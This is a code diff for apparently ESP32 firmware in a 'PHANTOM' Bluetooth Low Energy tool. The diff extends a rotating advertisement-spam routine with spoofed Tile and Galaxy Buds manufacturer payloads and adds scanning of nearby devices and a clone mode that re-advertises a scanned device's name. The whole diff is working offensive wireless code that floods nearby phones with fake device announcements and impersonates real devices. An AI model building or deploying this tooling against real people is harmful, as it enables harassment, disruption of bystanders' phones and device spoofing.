@@ -32,9 +32,36 @@ static const size_t kPayloadSamsungLen = sizeof(kPayloadSamsung);
 // Windows (Surface / accessories) — manufacturer 0x0006.
 static const uint8_t kPayloadWindows[] = {0x06, 0x00, 0x03, 0x00, 0x01, 0x02};
 static const size_t kPayloadWindowsLen = sizeof(kPayloadWindows);
+
+// Tile (tracker) — manufacturer 0x0A65, common trigger.
+static const uint8_t kPayloadTile[] = {0x65, 0x0a, 0x01, 0x00,
+                                       0x00, 0x00, 0x00, 0x00};
+static const size_t kPayloadTileLen = sizeof(kPayloadTile);
+
+// Galaxy Buds — Samsung 0x0075, type 0x07.
+static const uint8_t kPayloadGalaxyBuds[] = {0x75, 0x00, 0x07, 0x01,
+                                             0x02, 0x03, 0x04, 0x05};
+static const size_t kPayloadGalaxyBudsLen = sizeof(kPayloadGalaxyBuds);
+
+static BleManager *s_bleManager = nullptr;
+
+class BleScanCallbacks : public NimBLEAdvertisedDeviceCallbacks {
+  void onResult(NimBLEAdvertisedDevice *device) override {
+    if (s_bleManager == nullptr)
+      return;
+    s_bleManager->onScanResult(device);
+  }
+};
+static BleScanCallbacks *s_scanCb = nullptr;
 #endif
 
-BleManager::BleManager() {}
+BleManager::BleManager() {
+#if __has_include("NimBLEDevice.h")
+  memset(scanDevices_, 0, sizeof(scanDevices_));
+  cloneName_[0] = '\0';
+  cloneAddr_[0] = '\0';
+#endif
+}
 
 void BleManager::setPayload(int index) {
 #if __has_include("NimBLEDevice.h")
@@ -87,6 +114,17 @@ void BleManager::setPayload(int index) {
     std::vector<uint8_t> windowsData(kPayloadWindows,
                                      kPayloadWindows + kPayloadWindowsLen);
     advData.setManufacturerData(windowsData);
+  } break;
+  case 4: // Tile
+  {
+    std::vector<uint8_t> tileData(kPayloadTile, kPayloadTile + kPayloadTileLen);
+    advData.setManufacturerData(tileData);
+  } break;
+  case 5: // Galaxy Buds
+  {
+    std::vector<uint8_t> budsData(kPayloadGalaxyBuds,
+                                  kPayloadGalaxyBuds + kPayloadGalaxyBudsLen);
+    advData.setManufacturerData(budsData);
   } break;
   default: {
     std::vector<uint8_t> appleData(kPayloadApple,
@@ -180,38 +218,41 @@ void BleManager::begin() {
 
 void BleManager::stop() {
 #if __has_include("NimBLEDevice.h")
-  if (!active_) {
+  if (!active_ && !scanning_)
     return;
+  if (scanning_) {
+    NimBLEScan *pScan = NimBLEDevice::getScan();
+    if (pScan)
+      pScan->stop();
+    s_bleManager = nullptr;
+    scanning_ = false;
   }
-
   NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
   if (pAdvertising != nullptr) {
     pAdvertising->stop();
-    yield(); // Allow BLE stack to process stop command
+    yield();
   }
-
   if (NimBLEDevice::getInitialized()) {
     NimBLEDevice::deinit(true);
-    yield(); // Allow BLE stack to deinitialize
+    yield();
   }
-
   active_ = false;
+  cloning_ = false;
   packetCount_ = 0;
   currentPayloadIndex_ = 0;
-  Serial.println("[PHANTOM] BLE spam STOPPED.");
+  Serial.println("[PHANTOM] BLE STOPPED.");
 #else
   active_ = false;
+  scanning_ = false;
 #endif
 }
 
 void BleManager::tick() {
 #if __has_include("NimBLEDevice.h")
-  if (!active_)
+  if (!active_ || scanning_)
     return;
 
-  // Проверка состояния BLE
   if (!NimBLEDevice::getInitialized()) {
-    Serial.println("[PHANTOM] BLE deinitialized, stopping...");
     active_ = false;
     return;
   }
@@ -220,14 +261,121 @@ void BleManager::tick() {
   if (now - lastRotateMs_ >= BLE_PHANTOM_ROTATE_MS) {
     lastRotateMs_ = now;
     int next = (currentPayloadIndex_ + 1) % BLE_PHANTOM_PAYLOAD_COUNT;
-
     NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
     if (pAdvertising != nullptr) {
       pAdvertising->stop();
-      yield(); // Allow BLE stack to process stop command
+      yield();
     }
-
     setPayload(next);
   }
+#endif
+}
+
+#if __has_include("NimBLEDevice.h")
+void BleManager::onScanResult(void *device) {
+  NimBLEAdvertisedDevice *dev = (NimBLEAdvertisedDevice *)device;
+  if (dev == nullptr || scanCount_ >= BLE_SCAN_DEVICE_MAX)
+    return;
+  std::string addr = dev->getAddress().toString();
+  std::string name = dev->getName();
+  int rssi = dev->getRSSI();
+  for (int i = 0; i < scanCount_; i++) {
+    if (strcmp(scanDevices_[i].addr, addr.c_str()) == 0) {
+      scanDevices_[i].rssi = rssi;
+      if (name.length() > 0)
+        strncpy(scanDevices_[i].name, name.c_str(), BLE_DEVICE_NAME_LEN - 1);
+      return;
+    }
+  }
+  int i = scanCount_++;
+  strncpy(scanDevices_[i].addr, addr.c_str(), BLE_DEVICE_ADDR_LEN - 1);
+  scanDevices_[i].addr[BLE_DEVICE_ADDR_LEN - 1] = '\0';
+  if (name.length() > 0)
+    strncpy(scanDevices_[i].name, name.c_str(), BLE_DEVICE_NAME_LEN - 1);
+  else
+    strncpy(scanDevices_[i].name, "(unknown)", BLE_DEVICE_NAME_LEN - 1);
+  scanDevices_[i].name[BLE_DEVICE_NAME_LEN - 1] = '\0';
+  scanDevices_[i].rssi = rssi;
+}
+#endif
+
+void BleManager::beginScan() {
+#if __has_include("NimBLEDevice.h")
+  if (WiFi.getMode() != WIFI_OFF) {
+    WiFi.disconnect(true);
+    yield();
+    WiFi.mode(WIFI_OFF);
+    delay(100);
+  }
+  if (scanning_ || active_) {
+    if (active_ && !scanning_)
+      stop();
+  }
+  s_bleManager = this;
+  if (!NimBLEDevice::getInitialized())
+    NimBLEDevice::init("SCAN");
+  scanCount_ = 0;
+  memset(scanDevices_, 0, sizeof(scanDevices_));
+  NimBLEScan *pScan = NimBLEDevice::getScan();
+  if (pScan) {
+    if (s_scanCb == nullptr)
+      s_scanCb = new BleScanCallbacks();
+    pScan->setAdvertisedDeviceCallbacks(s_scanCb);
+    pScan->setInterval(80);
+    pScan->setWindow(50);
+    pScan->setActiveScan(true);
+    pScan->start(0, nullptr);
+    scanning_ = true;
+    active_ = true;
+    Serial.println("[BLE] Scan ACTIVE.");
+  }
+#else
+  scanning_ = false;
+  active_ = false;
+#endif
+}
+
+void BleManager::stopScan() {
+#if __has_include("NimBLEDevice.h")
+  if (!scanning_)
+    return;
+  NimBLEScan *pScan = NimBLEDevice::getScan();
+  if (pScan)
+    pScan->stop();
+  if (NimBLEDevice::getInitialized())
+    NimBLEDevice::deinit(true);
+  s_bleManager = nullptr;
+  scanning_ = false;
+  active_ = false;
+  Serial.println("[BLE] Scan STOP.");
+#endif
+}
+
+const BleScanDevice *BleManager::getScanDevice(int index) const {
+  if (index < 0 || index >= scanCount_)
+    return nullptr;
+  return &scanDevices_[index];
+}
+
+void BleManager::cloneDevice(int index) {
+#if __has_include("NimBLEDevice.h")
+  if (index < 0 || index >= scanCount_)
+    return;
+  stopScan();
+  strncpy(cloneName_, scanDevices_[index].name, BLE_DEVICE_NAME_LEN - 1);
+  cloneName_[BLE_DEVICE_NAME_LEN - 1] = '\0';
+  strncpy(cloneAddr_, scanDevices_[index].addr, BLE_DEVICE_ADDR_LEN - 1);
+  cloneAddr_[BLE_DEVICE_ADDR_LEN - 1] = '\0';
+  cloning_ = true;
+  NimBLEDevice::init(cloneName_);
+  NimBLEAdvertising *pAdv = NimBLEDevice::getAdvertising();
+  if (pAdv) {
+    NimBLEAdvertisementData adv;
+    adv.setName(cloneName_);
+    pAdv->setAdvertisementData(adv);
+    pAdv->start(0, nullptr);
+  }
+  active_ = true;
+  Serial.printf("[BLE] Clone: %s\n", cloneName_);
 #endif
 }
